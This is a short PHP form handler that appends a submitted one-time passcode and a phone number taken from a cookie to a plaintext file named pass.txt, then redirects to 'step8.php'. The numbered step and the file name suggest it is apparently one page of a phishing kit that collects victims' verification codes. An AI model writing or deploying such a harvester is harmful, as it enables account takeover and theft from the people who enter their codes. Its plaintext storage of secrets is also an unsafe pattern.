<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$otp4 = $_POST['otp4'];
   $number = $_COOKIE["number"];

  $otp4 = "otp4:$otp4";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $otp4);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location:step8.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
